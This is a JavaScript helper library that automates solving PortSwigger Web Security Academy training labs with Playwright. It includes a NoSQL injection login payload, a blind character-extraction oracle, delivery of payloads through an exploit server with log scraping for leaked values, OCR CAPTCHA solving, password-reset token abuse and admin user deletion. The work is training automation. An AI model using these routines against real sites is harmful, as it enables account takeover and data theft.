const { chromium } = require('playwright');
const { execFileSync } = require('child_process');
const { writeFileSync, unlinkSync } = require('fs');
const { tmpdir } = require('os');
const { join } = require('path');

const APP = 'https://portswigger.net';
const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

function requireAcademyCreds() {
  if (!EMAIL || !PASSWORD) {
    throw new Error('Set PORTSWIGGER_EMAIL and PORTSWIGGER_PASSWORD env vars');
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function normalizeText(value) {
  return (value || '').replace(/\s+/g, ' ').trim();
}

function asAbsoluteUrl(baseUrl, href) {
  if (!href) return '';
  try {
    return new URL(href, baseUrl).toString();
  } catch {
    return '';
  }
}

async function loginAcademy(page) {
  await page.goto(APP + '/users', { waitUntil: 'networkidle', timeout: 30000 });
  await page.fill('#EmailAddress', EMAIL);
  await page.fill('#Password', PASSWORD);
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.click('#Login'),
  ]);
  await page.waitForTimeout(1200);
}

async function findLabHrefByTitle(page, title) {
  await page.goto(APP + '/web-security/all-labs', { waitUntil: 'networkidle', timeout: 30000 });
  await page.waitForTimeout(1500);
  const lab = await page.evaluate((expectedTitle) => {
    const normalize = (value) => (value || '').replace(/\s+/g, ' ').trim();
    const target = normalize(expectedTitle);
    const items = [...document.querySelectorAll('.widgetcontainer-lab-link')].map((el) => {
      const a = el.querySelector('a');
      return {
        href: a?.getAttribute('href') || '',
        title: normalize(a?.textContent || ''),
        solved: el.className.includes('is-solved'),
      };
    });
    return items.find((item) => item.title === target) || items.find((item) => item.title.includes(target));
  }, title);
  if (!lab?.href) {
    throw new Error(`Lab not found for title: ${title}`);
  }
  return lab;
}

async function launchLab(page, title, path) {
  const tryOpen = async (href) => {
    await page.goto(APP + href, { waitUntil: 'networkidle', timeout: 30000 });
    return page.evaluate(() => {
      return [...document.querySelectorAll('a[href]')].find((a) => /labs\/launch/.test(a.getAttribute('href') || ''))?.href || null;
    });
  };

  let launchHref = null;
  if (path) {
    launchHref = await tryOpen(path).catch(() => null);
  }
  if (!launchHref) {
    const lab = await findLabHrefByTitle(page, title);
    launchHref = await tryOpen(lab.href);
  }
  if (!launchHref) {
    throw new Error('Launch link not found');
  }

  await page.goto(launchHref, { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForTimeout(5000);
  const labUrl = new URL(page.url()).origin;
  if (/web-security-academy\.net$/i.test(new URL(labUrl).hostname)) {
    return { labUrl, alreadySolved: false };
  }
  for (let i = 0; i < 24; i += 1) {
    try {
      const probe = await page.context().newPage();
      const response = await probe.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
      await probe.close();
      if (response && response.status() < 500) {
        return { labUrl, alreadySolved: Boolean(lab.solved) };
      }
    } catch {}
    await page.waitForTimeout(2500);
  }
  throw new Error('Lab did not become ready');
}

async function labLogin(page, labUrl, username = 'wiener', password = 'peter') {
  await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.fill('input[name="username"]', username);
  await page.fill('input[name="password"]', password);
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.click('button:has-text("Log in"), button[type="submit"], input[type="submit"]'),
  ]);
  await page.waitForTimeout(1000);
}

async function textContent(page, selector = 'body') {
  return (await page.textContent(selector).catch(() => '')) || '';
}

async function isSolved(page, labUrl) {
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  return /congratulations/i.test(await textContent(page));
}

async function waitForSolved(page, labUrl, timeoutMs = 120000, stepMs = 5000) {
  const startedAt = Date.now();
  while (Date.now() - startedAt <= timeoutMs) {
    // eslint-disable-next-line no-await-in-loop
    if (await isSolved(page, labUrl)) {
      return true;
    }
    // eslint-disable-next-line no-await-in-loop
    await sleep(stepMs);
  }
  return false;
}

async function getCsrf(page) {
  return page.locator('[name="csrf"]').first().inputValue().catch(() => '');
}

async function addToCart(page, labUrl, productId, quantity) {
  await page.evaluate(async ({ productId, quantity }) => {
    await fetch('/cart', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ productId: String(productId), redir: 'PRODUCT', quantity: String(quantity) }).toString(),
    });
  }, { productId, quantity });
  await page.waitForTimeout(150);
}

async function applyCoupon(page, coupon) {
  const csrf = await getCsrf(page);
  await page.evaluate(async ({ csrf, coupon }) => {
    const body = new URLSearchParams();
    if (csrf) body.set('csrf', csrf);
    body.set('coupon', coupon);
    await fetch('/cart/coupon', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  }, { csrf, coupon });
  await page.waitForTimeout(200);
}

async function checkout(page, labUrl) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const csrf = await getCsrf(page);
  await page.evaluate(async (csrfToken) => {
    const body = new URLSearchParams();
    if (csrfToken) body.set('csrf', csrfToken);
    await fetch('/cart/checkout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  }, csrf);
  await page.waitForTimeout(1000);
}

async function getExploitServerUrl(page, labUrl) {
  const candidates = [...new Set([
    page.url(),
    labUrl,
    new URL('/my-account', labUrl).toString(),
    new URL('/social-login', labUrl).toString(),
  ])];

  for (const candidate of candidates) {
    try {
      await page.goto(candidate, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const href = await page.evaluate(() => {
        const direct = document.querySelector('#exploit-link[href]');
        if (direct?.href) return direct.href;
        return [...document.querySelectorAll('a[href]')].find((a) => {
          const text = a.textContent || '';
          return /exploit server/i.test(text) || /exploit-server/i.test(a.href);
        })?.href || null;
      });
      if (href) {
        return href;
      }
    } catch {}
  }
  throw new Error('Exploit server not found');
}

async function followNamedLink(page, labUrl, pattern, fallbacks = []) {
  const href = await page.evaluate(({ source, flags }) => {
    const matcher = new RegExp(source, flags);
    const anchors = [...document.querySelectorAll('a[href]')];
    return anchors.find((anchor) => {
      const text = anchor.textContent || '';
      const hrefValue = anchor.getAttribute('href') || '';
      return matcher.test(text) || matcher.test(hrefValue);
    })?.getAttribute('href') || null;
  }, { source: pattern.source, flags: pattern.flags });

  for (const candidate of [href, ...fallbacks].filter(Boolean)) {
    const targetUrl = asAbsoluteUrl(labUrl, candidate);
    if (!targetUrl) continue;
    try {
      await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
      await page.waitForTimeout(1000);
      return targetUrl;
    } catch {}
  }
  throw new Error(`Link not found for ${pattern}`);
}

async function openLiveChat(page, labUrl) {
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const targetUrl = await followNamedLink(page, labUrl, /live chat|chat/i, ['/live-chat', '/chat']);
  await page.waitForTimeout(1000);
  return targetUrl;
}

async function sendChatMessage(page, message, waitMs = 12000) {
  const inputLocator = page.locator('textarea, input[type="text"], #message-box');
  if (!await inputLocator.count()) {
    await page.waitForTimeout(2000);
  }
  if (!await inputLocator.count()) {
    throw new Error('Chat input not found');
  }
  const input = inputLocator.first();

  const before = normalizeText(await textContent(page));
  await input.fill(message);

  const sendButtonLocator = page.getByRole('button', { name: /send|submit/i });
  if (await sendButtonLocator.count()) {
    await sendButtonLocator.first().click().catch(async () => input.press('Enter'));
  } else {
    await input.press('Enter');
  }

  await page.waitForTimeout(waitMs);
  const after = normalizeText(await textContent(page));
  if (after === before) {
    await page.waitForTimeout(5000);
  }
}

async function openProduct(page, labUrl, productPattern, fallbackId = '1') {
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const href = await page.evaluate(({ source, flags }) => {
    const matcher = new RegExp(source, flags);
    const anchors = [...document.querySelectorAll('a[href]')];
    return anchors.find((anchor) => matcher.test(anchor.textContent || ''))?.getAttribute('href') || null;
  }, { source: productPattern.source, flags: productPattern.flags });

  const targetUrl = asAbsoluteUrl(labUrl, href || `/product?productId=${fallbackId}`);
  await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  return targetUrl;
}

async function submitReview(page, review, name = 'wiener', email = 'wiener@example.com') {
  const reviewLocator = page.locator('textarea[name="comment"], textarea[name="review"], textarea');
  if (!await reviewLocator.count()) {
    throw new Error('Review field not found');
  }
  const reviewField = reviewLocator.first();

  await reviewField.fill(review);
  const nameLocator = page.locator('input[name="name"], input[name="author"]');
  if (await nameLocator.count()) {
    await nameLocator.first().fill(name);
  }
  const emailLocator = page.locator('input[name="email"]');
  if (await emailLocator.count()) {
    await emailLocator.first().fill(email);
  }
  const captchaLocator = page.locator('input[name="captcha"]');
  if (await captchaLocator.count()) {
    const captchaValue = await solveCaptcha(page);
    if (!captchaValue) {
      throw new Error('Captcha solution not found');
    }
    await captchaLocator.first().fill(captchaValue);
  }

  const submitLocator = page.getByRole('button', { name: /submit|post/i });
  if (await submitLocator.count()) {
    await Promise.all([
      page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
      submitLocator.first().click(),
    ]);
  } else {
    await Promise.all([
      page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
      page.locator('button[type="submit"], input[type="submit"]').first().click(),
    ]);
  }
  await page.waitForTimeout(1500);
}

async function openFirstBlogPost(page, labUrl) {
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const href = await page.evaluate(() => {
    const anchors = [...document.querySelectorAll('a[href]')];
    return anchors.find((anchor) => {
      const hrefValue = anchor.getAttribute('href') || '';
      return /postId=|blog-post|\/post\//i.test(hrefValue);
    })?.getAttribute('href') || null;
  });
  if (!href) {
    throw new Error('Blog post link not found');
  }
  const targetUrl = asAbsoluteUrl(labUrl, href);
  await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  return targetUrl;
}

async function submitComment(page, comment, name = 'wiener', email = 'wiener@example.com') {
  const commentLocator = page.locator('textarea[name="comment"], textarea[name="postComment"], textarea');
  if (!await commentLocator.count()) {
    throw new Error('Comment field not found');
  }
  const form = await page.evaluate(() => {
    const node = document.querySelector('form[action*="/post/comment"]') || document.querySelector('form');
    if (!node) {
      return null;
    }
    return {
      action: node.getAttribute('action') || location.pathname,
      fields: [...node.querySelectorAll('input[name], textarea[name], select[name]')].map((field) => ({
        name: field.getAttribute('name'),
        value: field.getAttribute('value') || '',
      })),
    };
  });
  if (!form) {
    throw new Error('Comment form not found');
  }

  const payload = {};
  for (const field of form.fields) {
    payload[field.name] = field.value;
  }
  payload.comment = comment;
  if ('name' in payload) {
    payload.name = name;
  }
  if ('author' in payload) {
    payload.author = name;
  }
  if ('email' in payload) {
    payload.email = email;
  }
  if ('website' in payload) {
    payload.website = payload.website || '';
  }
  if ('captcha' in payload) {
    const captchaValue = await solveCaptcha(page);
    if (!captchaValue) {
      throw new Error('Captcha solution not found');
    }
    payload.captcha = captchaValue;
  }

  await page.evaluate(async ({ action, payload }) => {
    const body = new URLSearchParams();
    for (const [key, value] of Object.entries(payload)) {
      body.set(key, value || '');
    }
    await fetch(action, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  }, { action: form.action, payload });
  await page.waitForTimeout(1500);
}

async function clickScanSite(page, waitMs = 25000) {
  const scanButtonLocator = page.getByRole('button', { name: /scan site/i });
  const scanLinkLocator = page.getByRole('link', { name: /scan site/i });
  if (await scanButtonLocator.count()) {
    await scanButtonLocator.first().click();
  } else if (await scanLinkLocator.count()) {
    await scanLinkLocator.first().click();
  } else if (await page.locator('#start-audit-btn').count()) {
    await page.evaluate(() => document.querySelector('#start-audit-btn')?.click());
  } else if (await page.locator('button[data-href="/scanresults"], #view-scan-results-link').count()) {
    await page.evaluate(() => document.querySelector('#start-audit-btn')?.click() || document.querySelector('#view-scan-results-link')?.click());
  } else {
    throw new Error('Scan site control not found');
  }
  await page.waitForTimeout(waitMs);
}

async function solveCaptcha(page) {
  const src = await page.evaluate(() => {
    return document.querySelector('#captcha-image, .captcha-container img, img[alt*="captcha" i]')?.getAttribute('src') || '';
  });
  if (!src.startsWith('data:image/')) {
    return '';
  }

  const filePath = join(tmpdir(), `omo-captcha-${Date.now()}-${Math.random().toString(36).slice(2)}.png`);
  writeFileSync(filePath, Buffer.from(src.split(',')[1] || '', 'base64'));
  try {
    const attempts = [
      ['--psm', '7'],
      ['--psm', '8'],
      ['--psm', '13'],
    ];
    for (const extraArgs of attempts) {
      try {
        const result = execFileSync(
          'tesseract',
          [filePath, 'stdout', ...extraArgs, '-c', 'tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'],
          {
            encoding: 'utf8',
            stdio: ['ignore', 'pipe', 'ignore'],
          },
        );
        const cleaned = result.replace(/[^A-Za-z0-9]/g, '').trim();
        if (cleaned) {
          return cleaned;
        }
      } catch {}
    }
    return '';
  } finally {
    try {
      unlinkSync(filePath);
    } catch {}
  }
}

async function submitSolutionAnswer(page, answer) {
  await page.evaluate(async (solution) => {
    await fetch('/submitSolution', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `answer=${encodeURIComponent(solution)}`,
    });
  }, answer);
  await page.waitForTimeout(1000);
}

async function fetchText(page, url, options = {}) {
  const method = options.method || 'GET';
  const requestOptions = {
    failOnStatusCode: false,
    headers: options.headers || {},
  };
  if (typeof options.maxRedirects === 'number') {
    requestOptions.maxRedirects = options.maxRedirects;
  }
  if (options.form) {
    requestOptions.form = options.form;
  }
  if (options.data) {
    requestOptions.data = options.data;
  }

  let response;
  if (method === 'POST') {
    response = await page.request.post(url, requestOptions);
  } else {
    response = await page.request.get(url, requestOptions);
  }
  return {
    status: response.status(),
    headers: response.headers(),
    text: await response.text(),
  };
}

async function storeExploit(page, exploitUrl, responseBody, deliver = true) {
  await page.goto(exploitUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const responseHead = 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8';
  await page.locator('textarea[name="responseHead"], textarea').first().fill(responseHead).catch(() => {});
  await page.locator('textarea[name="responseBody"], #responseBody, textarea').last().fill(responseBody);
  await page.getByRole('button', { name: /store/i }).click().catch(async () => page.click('input[value="Store"]'));
  await page.waitForTimeout(1200);
  if (deliver) {
    await page.getByRole('button', { name: /deliver exploit to victim|deliver/i }).click().catch(async () => page.click('input[value*="Deliver"]'));
    await page.waitForTimeout(2500);
  }
}

async function readExploitLog(page, exploitUrl) {
  await page.goto(exploitUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const href = await page.evaluate(() => {
    return [...document.querySelectorAll('a[href]')].find((a) => /access log/i.test(a.textContent || '') || /\/log$/.test(a.getAttribute('href') || ''))?.href || null;
  });
  await page.goto(href || new URL('/log', exploitUrl).toString(), { waitUntil: 'domcontentloaded', timeout: 15000 });
  return textContent(page);
}

async function waitForExploitValue(page, exploitUrl, pattern, attempts = 8) {
  for (let i = 0; i < attempts; i += 1) {
    const log = await readExploitLog(page, exploitUrl);
    const match = log.match(pattern);
    if (match) {
      return decodeURIComponent(match[1]);
    }
    await page.waitForTimeout(3000);
  }
  throw new Error('Expected value not found in exploit log');
}

async function openEmailClient(page, labUrl) {
  for (const candidate of ['/email', '/email-client', '/emails']) {
    try {
      await page.goto(labUrl + candidate, { waitUntil: 'domcontentloaded', timeout: 10000 });
      const body = await textContent(page);
      if (body && !/not found/i.test(body)) {
        return labUrl + candidate;
      }
    } catch {}
  }

  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const href = await page.evaluate(() => {
    return [...document.querySelectorAll('a[href]')].find((anchor) => {
      const text = anchor.textContent || '';
      const hrefValue = anchor.getAttribute('href') || '';
      return /email client/i.test(text) || /email/i.test(hrefValue);
    })?.href || null;
  });
  if (!href) {
    return null;
  }
  return asAbsoluteUrl(labUrl, href);
}

async function latestEmailLink(page, emailUrl, pattern) {
  await page.goto(emailUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
  await page.waitForTimeout(1000);
  const href = await page.evaluate(({ source, flags }) => {
    const matcher = new RegExp(source, flags);
    return [...document.querySelectorAll('a[href]')]
      .map((anchor) => anchor.getAttribute('href') || '')
      .find((value) => matcher.test(value)) || null;
  }, { source: pattern.source, flags: pattern.flags });
  if (href) {
    return asAbsoluteUrl(emailUrl, href);
  }

  const body = await textContent(page);
  const match = body.match(pattern);
  return match ? asAbsoluteUrl(emailUrl, match[0]) : null;
}

async function getEmailClientAddress(page, labUrl) {
  const emailUrl = await openEmailClient(page, labUrl);
  if (!emailUrl) {
    return null;
  }
  await page.goto(emailUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
  const body = await textContent(page);
  return body.match(/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i)?.[0] || null;
}

async function registerUserFromEmailClient(page, labUrl, username, password) {
  const emailAddress = await getEmailClientAddress(page, labUrl);
  if (!emailAddress) {
    throw new Error('Email client address not found');
  }
  const emailDomain = emailAddress.split('@')[1];
  const registrationEmail = emailDomain ? `${username}@${emailDomain}` : emailAddress;

  await page.goto(labUrl + '/register', { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.fill('input[name="username"]', username);
  await page.fill('input[name="email"]', registrationEmail);
  await page.fill('input[name="password"]', password);
  await Promise.all([
    page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
    page.click('button[type="submit"], button:has-text("Register"), input[type="submit"]'),
  ]);

  const emailUrl = await openEmailClient(page, labUrl);
  let confirmUrl = null;
  for (let attempt = 0; attempt < 5 && !confirmUrl; attempt += 1) {
    // eslint-disable-next-line no-await-in-loop
    await page.goto(emailUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
    // eslint-disable-next-line no-await-in-loop
    confirmUrl = await page.evaluate(({ recipient }) => {
      const rows = [...document.querySelectorAll('tr')].slice(1);
      const row = rows.find((item) => (item.textContent || '').includes(recipient));
      if (!row) {
        return null;
      }
      const directLink = [...row.querySelectorAll('a[href]')]
        .map((anchor) => anchor.getAttribute('href') || '')
        .find((href) => /\/confirm-registration\?|\/register\?temp-registration-token=/i.test(href));
      if (directLink) {
        return directLink;
      }
      const text = row.textContent || '';
      return text.match(/https:\/\/[^\s"'<]+(?:\/confirm-registration\?[^\s"'<]+|\/register\?temp-registration-token=[^\s"'<]+)/i)?.[0] || null;
    }, { recipient: registrationEmail });
    if (!confirmUrl) {
      // eslint-disable-next-line no-await-in-loop
      await page.waitForTimeout(1000);
    }
  }
  if (!confirmUrl) {
    confirmUrl = await latestEmailLink(
      page,
      emailUrl,
      /\/confirm-registration\?[^\s"'<]+|\/register\?temp-registration-token=[^\s"'<]+/i,
    );
  }
  if (confirmUrl) {
    await page.goto(asAbsoluteUrl(emailUrl, confirmUrl), { waitUntil: 'domcontentloaded', timeout: 10000 });
    await page.waitForTimeout(1000);
  }

  return { username, password, emailAddress: registrationEmail };
}

async function getOAuthLink(page, baseUrlOrPath, maybePath = '') {
  const targetUrl = maybePath
    ? new URL(maybePath, baseUrlOrPath).toString()
    : baseUrlOrPath;
  await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  let href = await page.evaluate(() => {
    const scoreLink = (anchor) => {
      const hrefValue = anchor.href || '';
      const text = (anchor.textContent || '').replace(/\s+/g, ' ').trim();
      const combined = `${text} ${hrefValue}`;
      let score = 0;
      if (/log in with social media|social media login|social login/i.test(text)) score += 100;
      if (/oauth-server|client_id=|response_type=|\/social-login|\/oauth/i.test(hrefValue)) score += 50;
      if (!/portswigger\.net/i.test(hrefValue)) score += 20;
      if (/portswigger\.net\/web-security\//i.test(hrefValue)) score -= 100;
      if (/back to lab description|all labs|oauth authentication|oauth 2\.0/i.test(combined)) score -= 200;
      return score;
    };

    const best = [...document.querySelectorAll('a[href]')]
      .filter((anchor) => /oauth|social/i.test(`${anchor.textContent || ''} ${anchor.href || ''}`))
      .sort((left, right) => scoreLink(right) - scoreLink(left))[0] || null;

    return best && scoreLink(best) > 0 ? best.href : null;
  });
  if (!href) {
    const html = await page.content();
    href = html.match(/https:\/\/[^"]+oauth[^"]+\/auth\?[^"<\s]+/i)?.[0]?.replace(/&amp;/g, '&') || '';
  }
  if (!href) {
    throw new Error('OAuth link not found');
  }
  return href;
}

async function finishSocialProviderAuth(page) {
  const user = page.locator('input[name="username"], #username, input[type="email"]').first();
  if (await user.count()) {
    await user.fill('wiener');
    await page.locator('input[name="password"], #password, input[type="password"]').first().fill('peter');
    await page.getByRole('button', { name: /log in|sign in|continue/i }).click().catch(async () => {
      await page.click('button[type="submit"], input[type="submit"]');
    });
  }
  const approve = page.getByRole('button', { name: /authorize|allow|continue/i });
  if (await approve.count()) {
    await approve.first().click().catch(() => {});
  }
  await page.waitForLoadState('domcontentloaded').catch(() => {});
  await page.waitForTimeout(1200);
}

async function getStoreCredit(page, labUrl) {
  await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const body = await textContent(page);
  const amounts = body.match(/\$([\d,]+(?:\.\d{2})?)/g)?.map((value) => Number(value.replace(/[$,]/g, ''))) || [];
  return Math.max(0, ...amounts);
}

async function extractGiftCardCode(page) {
  const body = await textContent(page);
  const longForm = body.match(/(?:[A-Z0-9]{4}-){3}[A-Z0-9]{4}/)?.[0]
    || body.match(/[A-Z0-9]{16}/)?.[0];
  if (longForm) {
    return longForm;
  }
  const shortCodes = body.match(/\b[A-Za-z0-9]{10}\b/g) || [];
  return shortCodes.at(-1) || '';
}

async function redeemGiftCard(page, labUrl, code) {
  await page.goto(labUrl + '/gift-card', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(async () => {
    await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
  });
  const csrf = await getCsrf(page);
  const field = await page.evaluate(() => {
    return [...document.querySelectorAll('input[name]')]
      .map((input) => input.name)
      .find((name) => !/^csrf$/i.test(name) && !/password|username/i.test(name)) || 'gift-card';
  });
  await page.evaluate(async ({ csrf, field, code }) => {
    const body = new URLSearchParams();
    if (csrf) body.set('csrf', csrf);
    body.set(field, code);
    await fetch('/gift-card', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  }, { csrf, field, code });
  await page.waitForTimeout(700);
}

async function deleteCarlos(page, labUrl) {
  await page.goto(labUrl + '/admin', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const link = page.locator('a[href*="delete"][href*="carlos"]').first();
  if (await link.count()) {
    await link.click();
    await page.waitForTimeout(1200);
  }
}

async function triggerReset(page, labUrl, username) {
  await page.goto(labUrl + '/forgot-password', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const csrf = await getCsrf(page);
  await page.evaluate(async ({ csrf, username }) => {
    const body = new URLSearchParams({ username });
    if (csrf) body.set('csrf', csrf);
    await fetch('/forgot-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  }, { csrf, username });
  await page.waitForTimeout(700);
}

async function noSqlWhere(page, labUrl, whereClause, loginUsername = 'carlos') {
  await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const csrf = await getCsrf(page);
  const result = await page.evaluate(async ({ csrf, whereClause, loginUsername }) => {
    const payload = { username: loginUsername, password: { $ne: 'invalid' }, $where: whereClause };
    const headers = { 'Content-Type': 'application/json' };
    const body = JSON.stringify(payload);
    const response = await fetch('/login', {
      method: 'POST',
      headers,
      body,
      redirect: 'follow',
    });
    return { url: response.url, text: await response.text(), csrf };
  }, { csrf, whereClause, loginUsername });
  return /account locked|my-account|log out|your username is:/i.test(`${result.url}\n${result.text}`);
}

async function extractWithOracle(checker, charset, maxLen) {
  let value = '';
  for (let i = 0; i < maxLen; i += 1) {
    let found = '';
    for (const ch of charset) {
      // eslint-disable-next-line no-await-in-loop
      if (await checker(value + ch)) {
        found = ch;
        value += ch;
        break;
      }
    }
    if (!found) break;
  }
  return value;
}

async function resetPassword(page, labUrl, tokenField, token, username, password) {
  await page.goto(`${labUrl}/forgot-password?${encodeURIComponent(tokenField)}=${encodeURIComponent(token)}`, {
    waitUntil: 'domcontentloaded',
    timeout: 15000,
  });
  const csrf = await getCsrf(page);
  const names = await page.evaluate(() => [...document.querySelectorAll('input[name]')].map((input) => input.name));
  const body = new URLSearchParams();
  if (csrf) body.set('csrf', csrf);
  if (names.includes(tokenField)) body.set(tokenField, token);
  if (names.includes('username')) body.set('username', username);
  const pw1 = names.find((name) => /new-password-1|password-1|newPassword/i.test(name)) || names.find((name) => /password/i.test(name)) || 'new-password-1';
  const pw2 = names.find((name) => /new-password-2|password-2|confirm/i.test(name)) || 'new-password-2';
  body.set(pw1, password);
  body.set(pw2, password);
  await page.evaluate(async (payload) => {
    await fetch(location.pathname + location.search, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: payload,
    });
  }, body.toString());
  await page.waitForTimeout(800);
}

async function startKeepAlive(context, labUrl) {
  const keepPage = await context.newPage();
  let stopped = false;
  const timer = setInterval(async () => {
    if (stopped) return;
    await keepPage.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
  }, 60000);
  return async () => {
    stopped = true;
    clearInterval(timer);
    await keepPage.close().catch(() => {});
  };
}

async function runLab({ title, path, solve }) {
  requireAcademyCreds();
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const context = await browser.newContext({ viewport: { width: 1440, height: 960 } });
  const page = await context.newPage();
  let stopKeepAlive = null;
  try {
    await loginAcademy(page);
    const { labUrl } = await launchLab(page, title, path);
    stopKeepAlive = await startKeepAlive(context, labUrl);
    console.log(`LAB: ${title}`);
    console.log(`URL: ${labUrl}`);
    await solve({ browser, context, page, labUrl, sleep });
    const solved = await isSolved(page, labUrl);
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exitCode = solved ? 0 : 1;
  } catch (error) {
    console.error(String(error.stack || error));
    console.log('NOT SOLVED');
    process.exitCode = 1;
  } finally {
    if (stopKeepAlive) {
      await stopKeepAlive().catch(() => {});
    }
    await browser.close().catch(() => {});
  }
}

module.exports = {
  asAbsoluteUrl,
  addToCart,
  clickScanSite,
  applyCoupon,
  checkout,
  deleteCarlos,
  extractGiftCardCode,
  extractWithOracle,
  fetchText,
  finishSocialProviderAuth,
  followNamedLink,
  getCsrf,
  getEmailClientAddress,
  getExploitServerUrl,
  getOAuthLink,
  getStoreCredit,
  isSolved,
  labLogin,
  noSqlWhere,
  normalizeText,
  openFirstBlogPost,
  openEmailClient,
  openLiveChat,
  openProduct,
  readExploitLog,
  registerUserFromEmailClient,
  redeemGiftCard,
  resetPassword,
  runLab,
  sendChatMessage,
  sleep,
  submitComment,
  submitReview,
  submitSolutionAnswer,
  storeExploit,
  textContent,
  triggerReset,
  waitForSolved,
  waitForExploitValue,
  latestEmailLink,
};
